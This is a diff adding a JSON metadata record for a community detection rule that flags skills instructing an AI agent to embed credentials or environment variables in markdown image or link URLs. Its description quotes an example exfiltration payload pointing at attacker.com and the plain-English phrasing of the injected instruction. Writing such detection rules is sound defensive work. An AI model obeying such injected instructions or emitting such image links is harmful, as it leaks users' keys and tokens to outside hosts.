@@ -1,0 +1,19 @@
+{
+  "uuid": "8a2f0c06-78a6-435c-af5c-db26dd0048b7",
+  "title": "Natural-Language Output-Injection Credential Embedding",
+  "format": "atr",
+  "author": "ATR Community",
+  "license": "MIT",
+  "license_verified": true,
+  "description": "Detects output-injection patterns where a skill instructs the agent to embed\ncredentials, tokens, or environment variables inside a markdown image tag,\nlink, or HTML element so the leaked secret is exfiltrated when the user views\nthe rendered output. Common variant: ![x](https://attacker.com/?key=$API_KEY)\nexpressed as plain English (\"include the key as a query parameter on this\nimage URL\"). The discriminator is co-occurrence of an image-or-link\ntemplate-style construct with a credential placeholder.\n",
+  "source": "https://github.com/Agent-Threat-Rule/agent-threat-rules",
+  "tags": [
+    "tlp:clear",
+    "PAP:CLEAR"
+  ],
+  "attack_techniques": [],
+  "cve": [],
+  "created_at": "2026-06-18",
+  "last_modified": "2026-06-18",
+  "rulezet_url": "https://rulezet.org/rule/detail_rule/232315"
+}
